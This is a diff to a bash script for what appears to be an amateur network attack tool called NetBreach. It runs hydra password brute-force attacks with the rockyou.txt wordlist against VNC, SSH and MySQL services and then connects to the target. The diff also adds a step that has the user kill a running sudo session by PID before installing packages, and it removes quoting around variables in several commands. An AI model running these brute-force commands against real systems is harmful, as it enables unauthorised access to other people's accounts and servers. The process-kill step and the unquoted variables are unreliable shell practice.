@@ -41,38 +41,49 @@ trap ctrl_c SIGINT
 command_exists() {
     command -v "$1" >/dev/null 2>&1
 }
-
-
-# if the user uses the skip function it skips the install proccess of the packages
-if [[ "$1" = "--skip" && "$2" = "--xfreerdp" ]]; then
-    echo "Skipping package installation."
-    echo "And going to xfreerdp funciton"
+#get to the xfreerdp connection
+ConnectXfreerdp(){
+    read -p "Input username: " username
+    read -p "Input ip: " ip
+    read -s -p "Input password: " password
+    # Put the
+    echo
+    echo "Loading xfreerdp server..."
+    xfreerdp /u:"${username}" /v:"${ip}" /p:"${password}"
+    exit
+}
+# Check if the script is run with --xfreerdp
+if [[ $1 == "--xfreerdp" ]]; then
     ConnectXfreerdp
-    
-# else if the user doent use the skip function it installes the packages
-else
-    # Check for required packages
-    for package in "${required_packages[@]}"; do
-        if ! command_exists "$package"; then
-            echo ""
-            echo -e "[ ${RED}FAIL${NC} ] The required package ${GREEN}'${package}'${NC} is not installed. Please install it and try again."
-            sleep 1 
 
-            #asks the user if they want to install the packages that are mssing
-            echo "Would you like me to install it for you. YES/NO"
+fi
+# Check for required packages
+for package in "${required_packages[@]}"; do
+    if ! command_exists "$package"; then
+        echo ""
+        echo -e "[ ${RED}FAIL${NC} ] The required package ${GREEN}'${package}'${NC} is not installed. Please install it and try again."
+        sleep 1 
 
-            read -p ">>> " install
-            if [[ " ${yes[*]} " == *" ${install} "* ]]; then
-                bash requirements.sh
-                exit 1
-            else
-                echo "Ok stopping program"
-                exit 1
-            fi
+        #asks the user if they want to install the packages that are mssing
+        echo "Would you like me to install it for you. YES/NO"
+
+        read -p ">>> " install
+        
+        if [[ " ${yes[*]} " == *" ${install} "* ]]; then
+            ps aux | grep sudo
+            echo "Input the PID for to kill the root session to install the packages."
+            read -p ">>> " session
+            kill -9 "${session}"
+            bash requirements.sh
+            exit 1
+        else
+            echo "Ok stopping program"
             exit 1
         fi
-    done
-fi
+        exit 1
+    fi
+done
+
 # Check if the script is run with --help or -h
 if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
     figlet "? HELP ?"
@@ -201,7 +212,7 @@ else
                 read -p "Input Port: " port
             }
 
-            RunHackingCommandWithVNC() 
+            RunHackingCommandWithVNC() {
                 if [[ $service == 5900 || $service == "VNC" ]]; then
                     # Checks if the user has put anything in the 'Input Username' function and the hostname function
                     # If not, it will prompt the user to enter the username and hostname
@@ -214,8 +225,6 @@ else
                     else
                         # Crack VNC password
                         hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host:$port
-                        
-                  
                         # Alerts the user that the computer is trying to connect to the VNC server
                         title="Connecting to ${host}"
                         Connecting_To_VNC_SERVER="We are connecting you to '${host}'. Please wait..."
@@ -230,34 +239,20 @@ else
                         echo
                         echo "${title}"
                         echo "${Connected_To_VNC_SERVER}"
-
-                        read -p "Input username: " username
-                        read -p "Input ip: " ip
-                        read -p -s "Input password: " password
                         # Put the
                         echo
-                        echo "Loading xfreerdp server..."
-                        xfreerdp /u:"${username}" /v:"${ip}" /p:"${password}"
+                        echo "Loading VNC server..."
+                        open "vnc://${host}"
+                        exit
                     fi
                 fi
-            
-            #get to the xfreerdp connection
-            ConnectXfreerdp(){
-                read -p "Input username: " username
-                read -p "Input ip: " ip
-                read -p -s "Input password: " password
-                # Put the
-                echo
-                echo "Loading xfreerdp server..."
-                xfreerdp /u:"${username}" /v:"${ip}" /p:"${password}"
-                exit
             }
 
             RunHackingCommandWithSSH() {
                 if [[ $service == 22 || $service == "ssh" ]]; then
                     # Checks if the user has put anything in the 'Input Username' function and the hostname function
                     # If not, it will prompt the user to enter the username and hostname
-                    if [[ "${user}" == "" && "${host}" == "" || $user == "" || $host == "" ]]; then
+                    if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                         # No service specified, re-prompt for input
                         echo "No service specified"
                         NetBreach
@@ -266,7 +261,7 @@ else
                     else
 
                         # Crack SSH password
-                        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
+                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
                         # Alerts the user that the computer is trying to connect to the ssh server
                         title="Connecting to ${user}"
                         Connecting_To_SSH_SERVER="We are connecting you to ${user}. Please wait..."
@@ -299,22 +294,20 @@ else
                     # it will continue as normal
                     else
                         # Crack MySQL password
-                        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
+                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
                         echo "Loading MySQL server..."
                         sleep 3
-                        mysql -u "${user}" -p -A
+                        mysql -u $user -p -A
                     fi
                 fi
             }
+            NetBreach
 
-            NetBreach # Calls the NetBreach function
-
+            ConnectXfreerdp
             RunHackingCommand # Calls the RunHackingCommand function
 
             RunHackingCommandWithVNC # Calls the RunHackingCommandWithVNC function
-            
-            ConnectXfreerdp # call the xfreerdp command
-            
+
             RunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function
 
             RunHackingCommandWithMySQL # Calls the RunHackingCommandWithMySQL function
